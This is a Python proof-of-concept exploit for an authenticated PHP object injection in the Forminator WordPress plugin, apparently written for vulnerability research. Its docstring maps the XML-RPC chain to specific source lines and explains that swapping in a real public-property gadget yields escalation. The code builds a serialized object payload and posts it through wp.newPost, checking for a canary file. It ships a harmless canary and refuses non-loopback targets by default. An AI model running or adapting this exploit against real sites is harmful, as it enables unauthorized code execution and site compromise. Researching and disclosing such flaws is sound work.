#!/usr/bin/env python3
r"""
forminator 1.57.1 (introduced 1.57.1) — Authenticated first-order PHP Object Injection via
XML-RPC `forminator_form_meta` custom field (frm-xmlrpc-oi-001, eng-c3f3b10522de).

Chain (source-verified @1.57.1, OTW-verified WP 6.8.3 / PHP 7.4):
  POST /xmlrpc.php  wp.newPost / wp.editPost  (post_type=forminator_forms)
    -> xmlrpc_call hook (WP core class-wp-xmlrpc-server.php:1358) fires BEFORE post-cap checks
    -> validate_xmlrpc (library/class-core.php:182)  gate = forminator_is_user_allowed('forminator-cform')
         (manage_options default / manage_forminator_modules delegated tier)
    -> allow_xmlrpc_for_registration_forms (:240)
         maybe_unserialize($meta['value'])              (:244)  -- fails on wp_slash'd bytes
         maybe_unserialize(wp_unslash($meta['value']))  (:247)  -- succeeds, instantiates object
    -> object magic method runs (__wakeup/__destruct) at request shutdown

FIRST-ORDER: the serialized bytes are the attacker's own request body (no storage round-trip).

TRANSPORT CONSTRAINT (adversarial, verified OTW): XML 1.0 forbids U+0000 (raw or &#0; ->
-32700 parse error), so serialized payloads needing PRIVATE/PROTECTED prop keys
(\0Class\0prop) cannot travel through this vector. Use a PUBLIC-PROPERTY gadget
(the bundled FileCookieJar needs private props and is NOT reachable here).

This PoC ships a benign public-property canary payload that the TARGET does not
define; the lab rig must define a class named exactly `Lab_OI_PubProp_Canary`
with public `marker`/`path` and a `__wakeup` that writes a marker file under the
web uploads dir (see PoC note). Substituting any real public-prop gadget loaded
in the target gives the escalation.

Usage:
  ./poc_frm_xmlrpc_oi_gadget.py --url http://127.0.0.1:8095 --user admin --pass labpass
      [--marker RS_XMLRPC_<tok>]
"""
import argparse, sys, time, urllib.request, urllib.error, urllib.parse, os, re
from xml.sax.saxutils import escape

CN = "Lab_OI_PubProp_Canary"

def pstr(s):
    raw = s.encode("utf-8")
    return 's:%d:"%s";' % (len(raw), s)

def build_payload(marker: str, path: str) -> str:
    return 'O:%d:"%s":2:{%s%s%s%s}' % (len(CN), CN, pstr("marker"), pstr(marker), pstr("path"), pstr(path))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--user", required=True)
    ap.add_argument("--pass", dest="pw", required=True)
    ap.add_argument("--marker", default="RS_XMLRPC_%d" % int(time.time() * 1000))
    ap.add_argument("--artifact-dir", help="local uploads dir to assert the canary file (lab)")
    ap.add_argument("--artifact-url", help="HTTP URL of the self-removing lab canary artifact")
    ap.add_argument("--allow-remote", action="store_true",
                    help="permit a non-loopback URL (requires separate authorization)")
    args = ap.parse_args()

    host = urllib.parse.urlparse(args.url).hostname
    if not args.allow_remote and host not in {"127.0.0.1", "localhost", "::1"}:
        sys.exit("FAIL: refusing non-loopback target; use --allow-remote only for an explicitly authorized system")
    if not re.fullmatch(r"[A-Za-z0-9_-]+", args.marker):
        sys.exit("FAIL: marker must contain only letters, digits, underscore, or hyphen")

    body = build_payload(args.marker, "x")
    xml = (
        '<?xml version="1.0"?>\n<methodCall><methodName>wp.newPost</methodName><params>\n'
        '<param><value><int>1</int></value></param>\n'
        f'<param><value><string>{escape(args.user)}</string></value></param>\n'
        f'<param><value><string>{escape(args.pw)}</string></value></param>\n'
        '<param><value><struct>\n'
        '<member><name>post_type</name><value><string>forminator_forms</string></value></member>\n'
        '<member><name>post_status</name><value><string>publish</string></value></member>\n'
        f'<member><name>post_title</name><value><string>{escape(args.marker)}</string></value></member>\n'
        '<member><name>custom_fields</name><value><array><data><value><struct>\n'
        '<member><name>key</name><value><string>forminator_form_meta</string></value></member>\n'
        f'<member><name>value</name><value><string>{escape(body)}</string></value></member>\n'
        '</struct></value></data></array></value></member>\n'
        '</struct></value></param>\n</params></methodCall>'
    ).encode()

    print(f"[*] marker={args.marker}")
    print(f"[*] payload={body}")
    req = urllib.request.Request(args.url.rstrip("/") + "/xmlrpc.php", data=xml,
                                 headers={"Content-Type": "text/xml"})
    try:
        resp = urllib.request.urlopen(req, timeout=30).read()
        print("[*] XML-RPC response:", resp[:200])
    except urllib.error.HTTPError as e:
        print("[*] HTTP error:", e.code, e.read()[:300])
        print("[*] (write-then-fatal is expected on some rigs; assert the side-effect, not this code)")

    # Assert the side-effect: canary __wakeup wrote <marker> file under uploads.
    time.sleep(1)
    if args.artifact_dir:
        art = os.path.join(args.artifact_dir, "lab-oi-pubprop-%s.txt" % args.marker)
        if os.path.exists(art):
            print("[*] SIDE-EFFECT CONFIRMED:", art, "->", open(art).read())
            os.remove(art)
            print("RESULT=RS_OK_%s" % args.marker)
            return 0
        print("[!] artifact not found (canary class must be loaded in the XML-RPC request; "
              "check that the rig defines Lab_OI_PubProp_Canary)")
        return 1
    if args.artifact_url:
        try:
            artifact = urllib.request.urlopen(args.artifact_url, timeout=15).read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            artifact = e.read().decode("utf-8", "replace")
        expected = "CANARY:" + args.marker
        if expected in artifact:
            print("[*] SIDE-EFFECT CONFIRMED over HTTP:", expected)
            print("RESULT=RS_OK_%s" % args.marker)
            return 0
        print("[!] artifact endpoint did not return the marker:", artifact[:160])
        return 1
    print("[*] artifact-dir not provided; check the lab error log for the object-instantiation "
          "corroboration (class-core.php:249 Cannot use object of type ... as array).")
    return 0

if __name__ == "__main__":
    sys.exit(main())
